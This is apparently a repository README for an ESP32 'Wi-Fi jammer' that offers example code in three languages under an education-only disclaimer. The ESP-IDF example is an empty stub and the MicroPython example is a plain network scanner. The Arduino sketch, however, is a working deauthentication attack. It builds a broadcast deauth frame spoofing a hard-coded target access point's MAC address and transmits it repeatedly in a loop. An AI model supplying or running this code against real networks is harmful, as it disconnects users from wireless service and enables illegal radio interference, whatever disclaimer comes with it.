ESP32 Wi-Fi Jammer (Research & Education Only)

Disclaimer:
This project is strictly for educational and research purposes only.
Unauthorized interference with Wi-Fi networks is illegal and may lead to serious consequences.
Use only in controlled lab environments and on your own networks.

About

This repository showcases how basic Wi-Fi “jammer” functionalities can be prototyped on an ESP32 using multiple languages (C/C++, Arduino, MicroPython).
The main goal is to demonstrate concepts like network scanning and the deauthentication (deauth) mechanism.

| Feature                     | C/C++ (ESP-IDF) | Arduino | MicroPython |
| --------------------------- | :-------------: | :-----: | :---------: |
| Wi-Fi Network Scanning      |       Yes       |   Yes   |     Yes     |
| Deauth Packet Concept       |       Yes       |   Yes   |      No     |
| Easy-to-Modify Example Code |       Yes       |   Yes   |     Yes     |

Requirements

ESP32 development board

USB cable

ESP-IDF
 or Arduino IDE

(Optional) MicroPython firmware

Usage

1. Navigate to the language folder of your choice.

2. Follow the README instructions inside.

3. Upload the code to your ESP32.

Example Codes
C/C++ (ESP-IDF) — Basic Deauth

// main/wifi_deauth.c
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"

void app_main() {
    // Wi-Fi initialization and deauth packet sending logic.
    // See ESP-IDF docs for details.
    // Real deauth requires crafting & sending raw packets.
}
Arduino — Wi-Fi Jammer

#include <WiFi.h>
#include <esp_wifi.h>

// Deauthentication packet structure (26 bytes)
uint8_t deauthPacket[26] = {
  0xc0, 0x00, // Type: Deauth
  0x3a, 0x01, // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00, // Frag & Seq number
  0x07, 0x00  // Reason code: Class 3 frame received from non-associated STA
};

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);

  // Set the BSSID (target AP MAC address)
  uint8_t bssid[6] = {0x18, 0x3D, 0xA2, 0xEC, 0x32, 0x88};
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);

  Serial.println("Starting deauth process...");
}

void loop() {
  for (int i = 0; i < 20; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(100);
  }
  delay(2000);
}

MicroPython — Network Scan
import network
import time

sta = network.WLAN(network.STA_IF)
sta.active(True)

while True:
    nets = sta.scan()
    print("Available Networks:")
    for net in nets:
        ssid = net[0].decode('utf-8')
        bssid = ':'.join('{:02x}'.format(b) for b in net[1])
        print("SSID:", ssid, "BSSID:", bssid, "RSSI:", net[3])
    time.sleep(10)

Notes

Use only in lab & research contexts

Do not use against real networks

Examples may require adjustments (libraries, configs, permissions)

License

MIT
